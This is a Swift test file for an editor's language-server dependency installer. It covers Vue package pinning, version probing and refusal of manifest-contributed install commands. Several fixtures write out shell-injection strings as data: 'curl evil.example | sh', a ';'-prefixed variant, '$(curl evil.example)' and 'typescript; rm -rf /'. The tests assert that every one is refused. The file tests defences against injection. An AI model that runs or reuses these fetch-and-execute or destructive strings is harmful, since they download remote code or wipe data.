import Foundation
@testable import Ghostty
import Testing

/// What a server needs beyond its own binary, and what may reach a shell.
///
/// Two things are under test and only one of them is a feature. The feature is
/// that a `.vue` file's two servers and the plugin between them can be
/// installed from one screen, pinned so they cannot skew. The other is the
/// property the multi-package shape had to not break: `installCommand` refuses
/// every definition a manifest contributed, because the string it returns is
/// handed to `$SHELL -lic`, and a list of packages is a new way to smuggle one
/// in if the guard is left on the singular path.
///
/// Nothing here draws a view. The popover's whole state — which boxes are
/// ticked, what command that produces — is a pure function of a plan and a
/// probed machine, and that is the level everything is asserted at.
struct LSPServerDependencyTests {
    // MARK: A manifest, for the refusals

    private func manifest(command: String) -> LanguageManifest {
        let root = URL(fileURLWithPath: "/tmp/phantom-deps").appendingPathComponent("acme.elixir")
        let json = #"""
        {
          "schemaVersion": 1,
          "id": "acme.elixir",
          "name": "Elixir Pack",
          "version": "1.0.0",
          "publisher": "acme",
          "contributes": {
            "languages": [
              {
                "languageId": "elixir",
                "name": "Elixir",
                "extensions": ["ex"],
                "server": {
                  "command": "\#(command)",
                  "installHint": "curl evil.example | sh"
                }
              }
            ]
          }
        }
        """#
        return LanguageManifest.parse(
            data: Data(json.utf8),
            url: root.appendingPathComponent(LanguageManifest.fileName),
            root: root,
            scope: .user
        )!
    }

    private func contributedServer(named command: String) throws -> LSPServerDefinition {
        let catalog = LanguageCatalog.resolve(manifests: [manifest(command: command)], promotions: [])
        return try #require(catalog.contributed.first?.serverDefinition)
    }

    private func vue() throws -> LSPServerDefinition {
        try #require(LSPServerRegistry.server(forLanguage: "vue"))
    }

    private func typescript() throws -> LSPServerDefinition {
        try #require(LSPServerRegistry.server(forLanguage: "typescript"))
    }

    /// Every command the catalog has a plan for, read off the registry rather
    /// than listed here.
    ///
    /// It used to be a literal pair, and that is how this file broke: the
    /// TypeScript wrapper's plan was removed — deliberately, because the
    /// global `typescript` in it collided with the native row — and seven
    /// tests failed for naming a plan instead of asking for one.
    private var plannedCommands: [String] {
        LSPServerRegistry.distinctServers
            .filter { $0.dependencyPlan != nil }
            .map(\.command)
    }

    // MARK: The refusal

    /// The interesting half is that both names are commands the catalog has a
    /// plan for. A lookup keyed on the command alone would hand a file on disk
    /// `npm i -g @vue/language-server@3.3.10 …` — the same mistake
    /// `uninstallCommand` made when it offered `rustup component remove` to a
    /// manifest calling itself `rust-analyzer`.
    @Test func aContributedServerGetsNoDependencyPlanEvenWhenItNamesOne() throws {
        for command in ["vue-language-server", "typescript-language-server", "rust-analyzer"] {
            let definition = try contributedServer(named: command)

            #expect(definition.dependencyPlan == nil, "\(command) was handed a plan")

            /// Nil for every selection anyone could pass, including the one a
            /// caller would build by copying the built-in row's ids.
            for selection: Set<String> in [
                [],
                ["typescript"],
                ["@vue/language-server", "@vue/typescript-plugin"],
                ["curl evil.example | sh"],
            ] {
                #expect(
                    definition.installCommand(forDependencies: selection) == nil,
                    "\(command) offered a command for \(selection)"
                )
            }

            /// And the singular path it could already not reach is still shut.
            #expect(definition.installCommand == nil)
            #expect(definition.uninstallCommand == nil)
        }
    }

    /// The guard has to be the origin and not the absence of a plan, or every
    /// built-in server without one would be a hole.
    @Test func aBuiltInServerWithNoPlanStillOffersNothingMultiPackage() throws {
        let rust = try #require(LSPServerRegistry.server(forLanguage: "rust"))

        #expect(rust.dependencyPlan == nil)
        #expect(rust.installCommand(forDependencies: ["typescript"]) == nil)
        /// Its own single command is untouched.
        #expect(rust.installCommand == "rustup component add rust-analyzer")
    }

    /// Vue is the one server that needs more than a binary: its own server,
    /// the tsserver plugin, and the wrapper that loads the plugin.
    @Test func theServerThatNeedsMoreThanABinaryHasAPlan() throws {
        let vuePlan = try #require(vue().dependencyPlan)

        #expect(vuePlan.packages.map(\.package) == [
            "@vue/language-server",
            "@vue/typescript-plugin",
            "typescript-language-server",
        ])
    }

    /// And the TypeScript wrapper deliberately does not, which is the whole
    /// reason its row draws a plain Install: the plan's second package was a
    /// global `typescript`, and the native TypeScript row installs that same
    /// package at 7 as *itself*. Installing either row changed the other.
    @Test func theTypeScriptWrapperHasNoPlan() throws {
        #expect(try typescript().dependencyPlan == nil)
        #expect(LSPDependencyCatalog.plan(forCommand: "typescript-language-server") == nil)
    }

    /// A plan naming one package twice is not a cosmetic mistake: the status
    /// dictionary is built with `Dictionary(uniqueKeysWithValues:)`, which
    /// traps on a duplicate key, so a typo in the table would crash Settings
    /// rather than draw a repeated row.
    @Test func noPlanNamesAPackageTwice() throws {
        for command in plannedCommands {
            let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
            let ids = plan.packages.map(\.id)
            #expect(Set(ids).count == ids.count, "\(command) names a package twice")
        }
    }

    // MARK: Composing the command

    @Test func anUnrecognisedIdSelectsNothing() throws {
        let server = try typescript()

        #expect(server.installCommand(forDependencies: []) == nil)
        #expect(server.installCommand(forDependencies: ["not-a-package"]) == nil)
        #expect(server.installCommand(forDependencies: ["; curl evil.example | sh"]) == nil)
    }

    /// A selection that mixes a real id with an invented one installs the real
    /// one and nothing else — the invented string never becomes a word on the
    /// command line.
    @Test func aForgedIdBesideARealOneAddsNoWord() throws {
        let server = try vue()

        let command = try #require(
            server.installCommand(
                forDependencies: ["@vue/typescript-plugin", "; curl evil.example | sh"])
        )

        #expect(command == "npm i -g @vue/typescript-plugin@3.3.10")
        #expect(!command.contains("curl"))
        #expect(!command.contains(";"))
    }

    /// The command keeps the plan's order rather than the set's, which has
    /// none — otherwise the line shown in the popover would reshuffle between
    /// openings for no reason a reader could see.
    @Test func theCommandFollowsThePlansOrder() throws {
        let server = try vue()

        let command = try #require(
            server.installCommand(forDependencies: [
                "typescript-language-server",
                "@vue/language-server",
                "@vue/typescript-plugin",
            ])
        )

        #expect(command == "npm i -g @vue/language-server@3.3.10 "
            + "@vue/typescript-plugin@3.3.10 typescript-language-server")
    }

    @Test func aPartialSelectionInstallsOnlyWhatIsTicked() throws {
        let server = try vue()

        #expect(
            server.installCommand(forDependencies: ["@vue/typescript-plugin"])
                == "npm i -g @vue/typescript-plugin@3.3.10"
        )
        #expect(
            server.installCommand(forDependencies: ["typescript-language-server"])
                == "npm i -g typescript-language-server"
        )
    }

    /// Every spec in the table is concatenated into a shell line with no
    /// quoting, so the table itself is the thing that has to be safe.
    @Test func everySpecInTheCatalogIsShellSafe() throws {
        for command in plannedCommands {
            let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
            for dependency in plan.packages {
                #expect(
                    LSPDependencyCatalog.isShellSafe(dependency.spec),
                    "\(dependency.spec) is not safe on a shell line"
                )
            }
        }
    }

    @Test func aSpecWithShellSyntaxIsRefused() {
        #expect(!LSPDependencyCatalog.isShellSafe(""))
        #expect(!LSPDependencyCatalog.isShellSafe("typescript; rm -rf /"))
        #expect(!LSPDependencyCatalog.isShellSafe("$(curl evil.example)"))
        #expect(!LSPDependencyCatalog.isShellSafe("a b"))
        #expect(LSPDependencyCatalog.isShellSafe("@vue/typescript-plugin@3.3.10"))
    }

    // MARK: The pins

    /// The failure this popover exists to prevent: `@vue/language-server` and
    /// `@vue/typescript-plugin` ship together out of one repo, so a machine
    /// that installed one months ago and the other today has a mismatched pair
    /// that reports nothing and completes nothing.
    @Test func theVuePairIsPinnedToTheSameExactVersion() throws {
        let plan = try #require(vue().dependencyPlan)

        let server = try #require(plan.packages.first { $0.package == "@vue/language-server" })
        let plugin = try #require(plan.packages.first { $0.package == "@vue/typescript-plugin" })

        let pin = try #require(server.pin)
        #expect(plugin.pin == pin)
        /// An exact version, not a major: "the same major" is not lockstep.
        #expect(pin.contains("."))
        #expect(server.spec == "@vue/language-server@\(pin)")
        #expect(plugin.spec == "@vue/typescript-plugin@\(pin)")
    }

    /// The wrapper installs **only itself**, and that is a conflict resolved
    /// rather than a package forgotten.
    ///
    /// It used to install a global `typescript@6` beside itself, pinned because
    /// npm's `latest` is TypeScript 7 — the native rewrite, which ships no
    /// `tsserver.js` for a wrapper to drive. The pin was right; the package was
    /// still wrong to be here. The native row installs `typescript` as
    /// *itself*, so the two rows fought over one global package and installing
    /// either changed the other.
    ///
    /// What makes dropping it safe is the routing, asserted in
    /// `TypeScriptRoutingTests`: a file reaches the wrapper only when its
    /// project has `node_modules/typescript`, and a project without one goes to
    /// `tsc --lsp` instead.
    @Test func theWrapperInstallsOnlyItself() throws {
        let server = try typescript()
        let command = try #require(server.installCommand)

        #expect(command == "npm i -g typescript-language-server")
        #expect(!command.contains(" typescript@"))
        #expect(try #require(server.uninstallCommand) == "npm rm -g typescript-language-server")
    }

    /// Two installs at different times must produce the same versions, which
    /// means the spec cannot depend on when it was composed.
    @Test func everyPinnedDependencyCarriesItsPinOnTheSpec() throws {
        for command in plannedCommands {
            let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
            for dependency in plan.packages {
                guard let pin = dependency.pin else {
                    #expect(dependency.spec == dependency.package)
                    continue
                }
                #expect(dependency.spec == "\(dependency.package)@\(pin)")
            }
        }
    }

    /// Every dependency has to say when it is needed, because that sentence is
    /// the only thing a screen with no project in context can offer.
    @Test func everyDependencyExplainsWhenItIsNeeded() throws {
        for command in plannedCommands {
            let plan = try #require(LSPDependencyCatalog.plan(forCommand: command))
            #expect(!plan.packages.isEmpty)
            for dependency in plan.packages {
                #expect(!dependency.purpose.isEmpty, "\(dependency.package) says nothing")
            }
            /// And each plan hands the project-specific half to the editor.
            #expect(plan.projectNote?.isEmpty == false, "\(command) has no project note")
        }
    }

    // MARK: What is here

    private func vueStatuses(
        installedCommands: Set<String>,
        globalVersions: [String: String]
    ) throws -> [String: LSPDependencyStatus] {
        let plan = try #require(vue().dependencyPlan)
        return LSPDependencyCatalog.statuses(
            for: plan,
            installedCommands: installedCommands,
            globalVersions: globalVersions
        )
    }

    @Test func anAbsentBinaryAndAnAbsentPackageAreBothMissing() throws {
        let statuses = try vueStatuses(installedCommands: [], globalVersions: [:])

        #expect(statuses["@vue/language-server"] == .missing)
        #expect(statuses["@vue/typescript-plugin"] == .missing)
        #expect(statuses["typescript-language-server"] == .missing)
    }

    /// The package with no binary at all is the reason a `PATH` probe alone
    /// could never have answered this: `vue-language-server` on `PATH` says
    /// nothing about whether the plugin beside it exists.
    @Test func aPluginThatShipsNoBinaryIsSeenOnlyInTheGlobalPackages() throws {
        let statuses = try vueStatuses(
            installedCommands: ["vue-language-server", "typescript-language-server"],
            globalVersions: ["@vue/language-server": "3.3.10"]
        )

        #expect(statuses["@vue/language-server"] == .present)
        #expect(statuses["typescript-language-server"] == .present)
        #expect(statuses["@vue/typescript-plugin"] == .missing)
    }

    @Test func aPackageAtTheWrongVersionIsOutdatedRatherThanPresent() throws {
        let statuses = try vueStatuses(
            installedCommands: ["vue-language-server", "typescript-language-server"],
            globalVersions: [
                "@vue/language-server": "2.2.12",
                "@vue/typescript-plugin": "2.2.12",
            ]
        )

        #expect(statuses["@vue/language-server"] == .outdated(installed: "2.2.12"))
        #expect(statuses["@vue/typescript-plugin"] == .outdated(installed: "2.2.12"))
    }

    /// A binary installed from somewhere npm does not own — a version manager,
    /// Homebrew — has no `package.json` this app can read. Calling that
    /// outdated would put an install button under a server that is running.
    @Test func aBinaryWithNoReadableVersionIsPresentAndNotOutdated() throws {
        let statuses = try vueStatuses(
            installedCommands: ["vue-language-server", "typescript-language-server"],
            globalVersions: ["@vue/typescript-plugin": "3.3.10"]
        )

        #expect(statuses["@vue/language-server"] == .present)
    }

    /// A bare major pin is satisfied by any release in it — the point of `@6`
    /// is "not 7", not one particular patch.
    /// A pin of `6` means any 6.x, where a pin of `6.0.1` means exactly that.
    ///
    /// Built here rather than taken from the table, and the reason is worth
    /// stating: the only major pin the table ever had was the TypeScript
    /// wrapper's `typescript@6`, and it left with that plan. The branch is
    /// still reachable by any future plan, so it keeps a subject.
    @Test func aMajorPinAcceptsAnyReleaseInThatMajor() {
        let major = LSPServerDependency(
            package: "example",
            pin: "6",
            purpose: "fixture",
            presence: .globalPackage)

        for version in ["6.0.0", "6.4.2", "6.9.10"] {
            #expect(major.satisfies(version: version), "\(version) should satisfy @6")
        }
        #expect(!major.satisfies(version: "7.0.2"))
        #expect(!major.satisfies(version: "5.9.0"))
    }

    @Test func anExactPinMeansExactly() {
        let exact = LSPServerDependency(
            package: "example",
            pin: "3.3.10",
            purpose: "fixture",
            presence: .globalPackage)

        #expect(exact.satisfies(version: "3.3.10"))
        #expect(!exact.satisfies(version: "3.3.11"))
    }

    /// No pin accepts whatever is installed, which is what makes a package
    /// this app does not version-manage read as present rather than outdated.
    @Test func noPinAcceptsAnything() {
        let loose = LSPServerDependency(
            package: "example",
            purpose: "fixture",
            presence: .globalPackage)

        #expect(loose.satisfies(version: "0.0.1"))
    }

    // MARK: What the popover ticks

    @Test func theDefaultSelectionIsWhatIsMissingOrSkewed() throws {
        let plan = try #require(vue().dependencyPlan)
        let statuses = LSPDependencyCatalog.statuses(
            for: plan,
            installedCommands: ["vue-language-server", "typescript-language-server"],
            globalVersions: ["@vue/language-server": "2.2.12"]
        )

        let selection = LSPDependencyCatalog.defaultSelection(for: plan, statuses: statuses)

        /// The server is here but skewed, the plugin is absent, and the
        /// TypeScript server is fine — so two of the three are ticked.
        #expect(selection == ["@vue/language-server", "@vue/typescript-plugin"])
    }

    /// Before either probe answers every status is `.unknown`, and nothing is
    /// ticked. Guessing "missing" for the second it takes is how a reader
    /// reinstalls something they already have.
    @Test func nothingIsTickedBeforeTheProbeAnswers() throws {
        let plan = try #require(vue().dependencyPlan)
        let statuses = Dictionary(
            uniqueKeysWithValues: plan.packages.map { ($0.id, LSPDependencyStatus.unknown) }
        )

        #expect(LSPDependencyCatalog.defaultSelection(for: plan, statuses: statuses).isEmpty)
    }

    @Test func aFullyInstalledPlanTicksNothing() throws {
        let plan = try #require(vue().dependencyPlan)
        let statuses = LSPDependencyCatalog.statuses(
            for: plan,
            installedCommands: ["vue-language-server", "typescript-language-server"],
            globalVersions: [
                "@vue/language-server": "3.3.10",
                "@vue/typescript-plugin": "3.3.10",
            ]
        )

        #expect(LSPDependencyCatalog.defaultSelection(for: plan, statuses: statuses).isEmpty)
        /// Which is also what disables Install, so the button and the command
        /// under it cannot disagree.
        let server = try vue()
        #expect(server.installCommand(forDependencies: []) == nil)
    }

    // MARK: Reading the machine

    /// The rule half of the probe, against a directory a test built — the
    /// subprocess half (`npm root -g`) is deliberately not exercised, because
    /// a suite that depends on what npm happens to have installed is a suite
    /// that fails for reasons nobody changed.
    @Test func versionsAreReadFromTheGlobalNodeModules() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("phantom-deps-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: root) }

        try write(package: "@vue/typescript-plugin", version: "3.3.10", under: root)
        try write(package: "typescript", version: "7.0.2", under: root)

        let versions = LSPDependencyCatalog.versions(
            of: ["@vue/typescript-plugin", "typescript", "@vue/language-server"],
            inNodeModules: root.path
        )

        #expect(versions["@vue/typescript-plugin"] == "3.3.10")
        #expect(versions["typescript"] == "7.0.2")
        /// Absent from the dictionary rather than present with an empty value,
        /// which is what `status(of:…)` reads as missing.
        #expect(versions["@vue/language-server"] == nil)
    }

    /// A `package.json` that is not JSON, or has no version, is not a version.
    @Test func anUnreadableManifestYieldsNoVersion() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("phantom-deps-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: root) }

        let broken = root.appendingPathComponent("typescript")
        try FileManager.default.createDirectory(at: broken, withIntermediateDirectories: true)
        try Data("not json at all".utf8)
            .write(to: broken.appendingPathComponent("package.json"))

        let empty = root.appendingPathComponent("@vue/typescript-plugin")
        try FileManager.default.createDirectory(at: empty, withIntermediateDirectories: true)
        try Data(#"{"name": "@vue/typescript-plugin"}"#.utf8)
            .write(to: empty.appendingPathComponent("package.json"))

        let versions = LSPDependencyCatalog.versions(
            of: ["typescript", "@vue/typescript-plugin"],
            inNodeModules: root.path
        )

        #expect(versions.isEmpty)
    }

    /// The probe asks for each package once, however many plans name it.
    ///
    /// `typescript` is deliberately **not** among them any more: it left with
    /// the TypeScript wrapper's plan, because the native TypeScript row
    /// installs that package as itself.
    @Test func theProbeAsksForEachPackageOnce() {
        let packages = LSPDependencyCatalog.allPackages

        #expect(Set(packages).count == packages.count)
        #expect(packages.contains("@vue/typescript-plugin"))
        #expect(packages.contains("typescript-language-server"))
        #expect(!packages.contains("typescript"))
    }

    private func write(package: String, version: String, under root: URL) throws {
        let directory = root.appendingPathComponent(package)
        try FileManager.default.createDirectory(at: directory, withIntermediateDirectories: true)
        try Data(#"{"name": "\#(package)", "version": "\#(version)"}"#.utf8)
            .write(to: directory.appendingPathComponent("package.json"))
    }
}
